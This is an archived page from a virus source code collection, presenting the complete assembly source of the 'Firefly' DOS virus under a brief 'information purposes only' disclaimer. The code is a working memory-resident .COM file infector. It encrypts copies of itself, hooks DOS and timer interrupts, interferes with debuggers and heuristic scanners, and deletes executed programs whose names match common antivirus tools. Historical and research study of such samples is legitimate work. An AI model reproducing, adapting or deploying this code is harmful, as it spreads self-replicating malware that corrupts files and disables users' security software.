<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: firecris_asm</title>
<meta name="KEYWORDS" content="firecris.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for firecris.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="faces_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/faces_asm.php">faces_asm</a><br>
<a href="fade_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fade_asm.php">fade_asm</a><br>
<a href="faerie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/faerie_asm.php">faerie_asm</a><br>
<a href="fat_fuck_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fat_fuck_asm.php">fat_fuck_asm</a><br>
<a href="fatman__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fatman__asm.php">fatman__asm</a><br>
<a href="fatman_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fatman_asm.php">fatman_asm</a><br>
<a href="femifbia_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/femifbia_pas.php">femifbia_pas</a><br>
<a href="ffire_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/ffire_asm.php">ffire_asm</a><br>
<a href="firecide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firecide_asm.php">firecide_asm</a><br>
<a href="firecris_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firecris_asm.php">firecris_asm</a><br>
<a href="firecrpt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firecrpt_asm.php">firecrpt_asm</a><br>
<a href="firefly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firefly_asm.php">firefly_asm</a><br>
<a href="fish___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fish___asm.php">fish___asm</a><br>
<a href="fish__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fish__asm.php">fish__asm</a><br>
<a href="fish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fish_asm.php">fish_asm</a><br>
<a href="flagyll_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flagyll_asm.php">flagyll_asm</a><br>
<a href="flagyllz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flagyllz_asm.php">flagyllz_asm</a><br>
<a href="flip2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flip2_asm.php">flip2_asm</a><br>
<a href="flip_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flip_asm.php">flip_asm</a><br>
<a href="flu_not_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flu_not_asm.php">flu_not_asm</a><br>
<a href="flu_not_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flu_not_c.php">flu_not_c</a><br>
<a href="fmt12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fmt12_asm.php">fmt12_asm</a><br>
<a href="fonetone_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fonetone_asm.php">fonetone_asm</a><br>
<a href="foo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/foo_asm.php">foo_asm</a><br>
<a href="form2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/form2_asm.php">form2_asm</a><br>
<a href="formvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/formvir_asm.php">formvir_asm</a><br>
<a href="fri_13th_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fri_13th_asm.php">fri_13th_asm</a><br>
<a href="friday13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/friday13_asm.php">friday13_asm</a><br>
<a href="friday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/friday_asm.php">friday_asm</a><br>
<a href="frog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/frog_asm.php">frog_asm</a><br>
<a href="froggie_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/froggie_pas.php">froggie_pas</a><br>
<a href="frtfly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/frtfly_asm.php">frtfly_asm</a><br>
<a href="fruitfl2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fruitfl2_asm.php">fruitfl2_asm</a><br>
<a href="fruitfly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fruitfly_asm.php">fruitfly_asm</a><br>
<a href="fruitful_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fruitful_asm.php">fruitful_asm</a><br>
<a href="fumanchu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fumanchu_asm.php">fumanchu_asm</a><br>
<a href="fun_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fun_asm.php">fun_asm</a><br>
<a href="funked_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/funked_asm.php">funked_asm</a><br>
<a href="funkybom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/funkybom_asm.php">funkybom_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

                .radix 16
     code       segment
                model  small
                assume cs:code, ds:code, es:code

                org 100h

len             equ offset last - start
vir_len         equ len / 16d                    ; 16 bytes per paragraph 
encryptlength   equ (last - begin)/4+1



start:
                mov bx, offset begin        ; The Encryption Head
                mov cx, encryptlength       ;
encryption_loop:                            ;
                db      81h                 ; XOR WORD PTR [BX], ????h
                db      37h                 ;
encryption_value_1:                         ;
                dw      0000h               ;
                                            ;
                db      81h                 ; XOR WORD PTR [BX+2], ????h
                db      77h                 ;
                db      02h                 ; 2 different random words
encryption_value_2:                         ; give 32-bit encryption
                dw      0000h               ;
                add     bx, 4               ;
                loop    encryption_loop     ;
begin:                                           
                jmp virus             
                db     '[Firefly] By Nikademus $'
                db     'Greetings to Urnst Kouch and the CRYPT staff. $'
virus:     
                call    bp_fixup                 ; bp fixup to determine
bp_fixup:                                        ; locations of data
                pop     bp                       ; with respect to the new      
                sub     bp, offset bp_fixup      ; host                  

Is_I_runnin:    
                call    screw_fprot              ; screwing
                call    screw_fprot              ; heuristic scanning
                call    screw_fprot              ;
                call    screw_fprot              ;
                call    screw_fprot              ;
                call    screw_fprot              ;
                call    screw_fprot              ;
                call    screw_fprot              ;
                call    screw_fprot              ;
                call    screw_fprot              ;
                push    ds
                push    es
                mov     ax,2C2Ch                 ;  
                int     21h                      ; call to see if runnin  
                cmp     ax, 0FFFh                ; am i resident?
                jne     cut_hole                 ;
fix_victim:     
                pop     es                       ; replace victims 3 bytes
                pop     ds                       ;
                mov     di,050h                  ; stops one of SCAN's    
                add     di,0B0h                  ; generic scan attempts
                lea     si, ds:[vict_head + bp]  ; (scan only worked on        
                mov     cx, 03h                  ; unencrypted copies 
                rep     movsb                    ; regardless)
Bye_Bye: 
                mov     bx, 100h                 ; jump to 100h
                jmp     bx                       ; (start of victim)
cut_hole:  
                mov     dx, 5945h                ; pull CPAV (MSAV)
                mov     ax, 64001d               ; out of memory
                int     16h                      ; (This also screws with
                                                 ;  TBCLEAN ???????)
                
                call    screw_fprot              ; more screwing of
                call    screw_fprot              ; heuristic scanning
                call    screw_fprot              ;
                call    screw_fprot              ;
                call    screw_fprot              ;
                call    screw_fprot              ;

                mov     bx,cs                    ; reduce memory size     
                dec     bx                       ;    
                mov     ds,bx                    ;   
                cmp     byte ptr ds:[0000],5a    ;    
                jne     fix_victim               ;         
                mov     bx,ds:[0003]             ;    
                sub     bx, 100h                 ; # of 16byte paragraphs      
                mov     ds:0003,bx               ; to grab (4k)
Zopy_me:  
                xchg    bx, ax                   ; copy self to the new
                mov     bx, es                   ; 'unused' part of memory    
                add     bx, ax                   ;    
                mov     es, bx                   ;
                mov     cx,len                   ;
                mov     ax,ds                    ;   
                inc     ax                       ;
                mov     ds,ax                    ;
                lea     si,ds:[offset start+bp]  ;          
                lea     di,es:0100               ;   
                rep     movsb                    ;   

Hookroutines:                  ; interrupt manipulation (Happy!, Happy!)
                xor     ax, ax                    ;     (Joy!, Joy!)
                mov     ds, ax
                push    ds                        ; push 0000h
                lds     ax, ds:[1Ch*4]
                mov     word ptr es:old_1Ch, ax   ; save 1C
                mov     word ptr es:old_1Ch+2, ds 
                pop     ds
                push    ds
                lds     ax, ds:[21h*4]            ; get int 21h
                mov     word ptr es:old_21h, ax   ; save 21
                mov     word ptr es:old_21h+2, ds 
                mov     bx, ds                    ; bx = ds
                pop     ds
                mov     word ptr ds:[1h*4], ax    ; put int 21h into 1 and 3
                mov     word ptr ds:[1h*4+2], bx  ; this should screw   
                mov     word ptr ds:[3h*4], ax    ; most debuggers
                mov     word ptr ds:[3h*4+2], bx  
                mov     word ptr ds:[21h*4], offset Firefly ; put self in 21 
                mov     ds:[21h*4+2], es                    ;
                mov     ds:[1Ch*4+2], es
                mov     word ptr ds:[1Ch*4], offset Lights  ; hook 1C
                jmp     fix_victim
Lights:                                     ; keyboard lights changer...
                                            ; found in NIKTRKS1.ZIP
                push    ax                  ; save these
                push    bx                  ;
                push    cx                  ;
                push    dx                  ;
                push    si                  ;
                push    di                  ;
                push    ds                  ;
                push    es                  ;
                
                push    cs
                pop     ds
                push    cs
                pop     es
                cmp     [click], 63d         ; after 63 clicks
                je      one
                cmp     [click], 126d        ; after 126 clicks
                je      two
                cmp     [click], 189d        ; after 189 clicks
                je      three
                cmp     [click], 0ffh        ; have we counted to 255?
                je      clear
                inc     [click]              ; increase click count
                jmp     endme
clear:          mov     [click], 00h         ; clear click count
                mov     ax, 40h
                mov     ds, ax
                mov     bx, 17h              ; ds:bx = location o' flags
                and     byte ptr [bx],0      ; clear keyboard flag(s)
                jmp     endme
one:            inc     [click]
                mov     ax, 40h
                mov     ds, ax
                mov     bx, 17h
                mov     byte ptr [bx],20h    ; set numlock flag
                jmp     endme
two:            inc     [click]
                mov     ax, 40h
                mov     ds, ax
                mov     bx, 17h
                mov     byte ptr [bx],40h    ; set caps lock flag
                jmp     endme
three:          inc     [click]
                mov     ax, 40h
                mov     ds, ax
                mov     bx, 17h              
                mov     byte ptr [bx],10h    ; set scroll lock flag
endme:       
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                jmp     dword ptr cs:[old_1Ch]     ; Go to old int 1Ch
                db      'Psalm 69'
screw_fprot:
                jmp  $ + 2                 ;  Nested calls to confuse
                call screw2                ;  f-protect's heuristic
                call screw2                ;  analysis
                call screw2                ;
                call screw2                ;
                call screw2                ;
                ret                        ;
screw2:                                    ;
                jmp  $ + 2                 ;
                call screw3                ;
                call screw3                ;
                call screw3                ;
                call screw3                ;
                call screw3                ;
                ret                        ;
screw3:                                    ;
                jmp  $ + 2                 ;
                call screw4                ;
                call screw4                ;
                call screw4                ;
                call screw4                ;
                call screw4                ;
                ret                        ;
screw4:                                    ;
                jmp  $ + 2                 ;
                ret                        ;
                db      'Every day is Halloween'
Firefly:                                   
                pushf                              ; Am I checking if     
                cmp     ax,2c2ch                   ; I am resident?
                jne     My_21h                     ;
                mov     ax,0FFFh                   ; If so, return
                popf                               ; 0FFFh in AX    
                iret                               ;
                
My_21h:         
                push    ax                         ; save these
                push    bx                         ;
                push    cx                         ;
                push    dx                         ;
                push    si                         ;
                push    di                         ;
                push    ds                         ;
                push    es                         ;
check_for_proper_calls:     
                cmp     ah, 4Bh                    ; executed? 
                je      chk_com 
                cmp     ah, 3Dh                    ; open?
                je      chk_com
                cmp     ah, 43h                    ; attribs?
                je      chk_com
                cmp     ah, 6Ch                    ; extended open?
                je      extended              
               
notforme:       
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf
                jmp     dword ptr cs:[old_21h]     ; The End
                db      'Happiness in Slavery'
extended:
                mov     dx, si                     ; now a normal open
chk_com:        
                mov     word ptr cs:victim_name,dx
                mov     word ptr cs:victim_name+2,ds
                cld                          
                mov     di,dx                
                push    ds
                pop     es
                mov     al,'.'                     ; find the period
                repne   scasb                      ;
                call    avtest                
                cmp     ax, 00ffh                  ; WAS the program an AV?
                je      notforme
                cmp     word ptr es:[di],'OC'      ; is i a .(CO)M?
                jne     notforme                
Grab_24:                                           ; hook interrupt 24
                push    ds                         ; by direct writes to 
                push    dx                         ; interrupt vector
                xor     ax, ax                     ; table
                mov     ds, ax                     ;
                mov     dx, offset new_24h         ;
                mov     word ptr ds:[24h*4], dx    ;
                mov     word ptr ds:[24h*4+2], es  ; 
                pop     dx                         
                pop     ds                         
                
open_victim:      
                push    cs
                pop     es
                lds     dx, cs:victim_name       ; get and save attributes
                mov     ax, 4300h                ;
                int     3h                       ;
                jc      notforme                 ; error handler
                push    cx                       ;
                push    ds                       ;
                push    dx                       
                mov     ax, 4301h                ; clear attribs
                xor     cx, cx                   ;
                int     1h                       ;
                jc      notforme
                mov     ax,3D02h                 ; open victim
                lds     dx, cs:victim_name       ;
                int     3h                       ;
                jc      notforme                 ; error handler
                push    cs                       ;
                pop     ds                       ;
                xchg    ax, bx                   ; put handle in proper place
get_date:                                        ; get and save date 
                                                 ; and time
                mov     ax,5700h        
                int     3h
                push    cx                       ; save time
                push    dx                       ; save date
                
check_forme:    
                mov     ah,3fh                       ; read 1st 3 bytes
                mov     cx,03h                       ;
                mov     dx,offset vict_head          ;
                int     1h
                
                mov     ax, 4202h                    ; point to end
                xor     cx, cx                       ;
                xor     dx, dx                       ;
                int     3h                           ;
                
                mov     cx, word ptr [vict_head+1]   ; possible jump location
                add     cx, last-start+3             ;
                cmp     ax, cx                       ; already infected?
                jz      save_date                    ;
                push    ax
get_random:                
                mov     ah, 2Ch                      ; dx and (cx-dx)
                int     3h                           ; will be to two
                or      dx, dx                       ; encryption values
                jz      get_random                   ;
write_virus:    
                mov     word ptr [offset encryption_value_1], dx
                mov     word ptr [offset e_value_1], dx
                sub     cx, dx
                mov     word ptr [offset encryption_value_2], cx
                mov     word ptr [offset e_value_2], cx
                pop     ax
                mov     si, ax                       ; fix BX offset in head
                add     si, ((offset begin-offset start)+100h) 
                mov     word ptr [offset start+1], si  
                
                mov     si, offset start             ; copy virus to buffer
                mov     di, offset encryptbuffer     ;
                mov     cx, last-start               ;
                rep     movsb                        ;

                sub     ax, 03h                          ; construct jump
                mov     word ptr [offset new_jump+1], ax ;
                mov     dl, 0E9h                         ;
                mov     byte ptr [offset new_jump], dl   ;
Encryptvirus_in_buffer:                
                push    bx                                   ; encrypt copy
                mov bx, offset ((begin-start)+encryptbuffer) ; in encrypt-           
                mov cx, encryptlength                        ; buffer
e_loop:                                                      ;
                db      81h                                  ; XOR [bx]
                db      37h                                  ;  
e_value_1:                                                   ;
                dw      0000h                                ; scrambler #1
                db      81h                                  ; XOR [bx+2]
                db      77h                                  ;
                db      02h                                  ;
e_value_2:                                                   ;
                dw      0000h                                ; scrambler #2
                add     bx, 4                                ;
                loop    e_loop                               ; loop

                pop     bx
                mov     ah, 40h                      ; write virus   
                mov     cx, last-start               ;
                mov     dx, offset encryptbuffer     ;
                int     1h                           ;
                
                mov     ax, 4200h                    ; point to front
                xor     cx, cx                       ;
                xor     dx, dx                       ;
                int     1h                           ;
                
                mov     ah, 40h                      ; write jump
                mov     dx, offset new_jump          ;
                mov     cx, 03h                      ;
                int     3h                           ;
save_date:                                     
                pop     dx                        ; Date
                pop     cx                        ; Time
                mov     ax,5701h                  ;
                int     1h
                                               ;
close_file:                                    ;
                mov     ah,03Eh                ; Close file and restore  
                int     3h                     ; attribs
                mov     ax, 4301h              ;
                pop     dx                     ;
                pop     ds                     ; This is the end...
                pop     cx                     ; My only friend, The End.
                int     3h                     ;       - Jim Morrison
                jmp     notforme               ;
new_24h:        
                mov     al,3                   ; Critical Error (Mis)handler
                iret                           ;
                db      'The land of Rape and Honey'

                ; This area is the "intelligence" of Firefly
                ; It looks for known AV names which it then deletes.
                ; So it sort of shuts down the computers "immune system"
avtest:
                cmp     word ptr es:[di-3],'MI'    ;Integrity Master
                je      AV                         ;*IM
                
                cmp     word ptr es:[di-3],'XR'    ;*rx
                je      AV                         ;
                
                cmp     word ptr es:[di-3],'PO'    ;*STOP
                jne     next1                      ;(VIRSTOP)
                cmp     word ptr es:[di-5],'TS'    ;
                je      AV                         ;

next1:          cmp     word ptr es:[di-3],'VA'    ;*AV  i.e. cpav
                je      AV_Detected                ;(TBAV) (MSAV)  
                
                cmp     word ptr es:[di-3],'TO'    ;*prot  f-prot
                jne     next2                      ;
                cmp     word ptr es:[di-5],'RP'    ;
                jne     next2                      ;  
AV:             jmp     AV_Detected                ; must be equal

next2:          cmp     word ptr es:[di-3],'NA'    ;*scan  McAffee's 
                jne     next3                      ;(TBSCAN)
                cmp     word ptr es:[di-5],'CS'    ;
                je      AV_Detected                ;  
                
                cmp     word ptr es:[di-3],'NA'    ;*lean  CLEAN..
                jne     next3                      ; why not eh?
                cmp     word ptr es:[di-5],'EL'    ;(TBCLEAN)
                je      AV_Detected                ;  

next3:          cmp     word ptr es:[di-3],'CV'    ; Victor Charlie
                je      AV_Detected                ; default  *VC
                
                cmp     word ptr es:[di-3],'KC'    ; VCHECK
                jne     next4                      ; (Victor Charlie)
                cmp     word ptr es:[di-5],'EH'    ; (TBCHECK) *HECK
                je      AV_Detected                ;  
next4:                
                cmp     word ptr es:[di-3],'ME'    ; TBMEM
                jne     next5                      ; *BMEM
                cmp     word ptr es:[di-5],'MB'    ; 
                je      AV_Detected                ;  
next5:                
                cmp     word ptr es:[di-3],'XN'    ; TBSCANX
                jne     next6                      ; *CANX
                cmp     word ptr es:[di-5],'AC'    ; 
                je      AV_Detected                ;  
next6:                
                cmp     word ptr es:[di-3],'EL'    ; TBFILE
                jne     next7                      ; *FILE
                cmp     word ptr es:[di-5],'IF'    ; 
                je      AV_Detected                ;  
next7:                
                ret
AV_Detected:      
                mov     ds, word ptr cs:[victim_name + 2] ; The Victim
                mov     dx, word ptr cs:[victim_name]
                mov     ax, 4301h                    ; Clear it's attribs
                mov     cx, 00h                      ;
                int     1h
                mov     ah, 41h                      ; Delete It.
                int     3h                           ; 
                ret                                  ;
                db      'Its Dead Jim'                               

vict_head       db  090h, 0cdh, 020h                 ; 3 bytes of storage
old_21h         dw  00h,00h                          ; int 21 storage
old_1Ch         dw  00h,00h
click           db  00h
last:                                               

; The heap........   junk not needed in main program

victim_name     dd  ?
new_jump        db  090h, 090h, 090h       
encryptbuffer   db       (last-start)+1 dup (?)
code            ends
                end start

</textarea></td></tr></table></body></html>
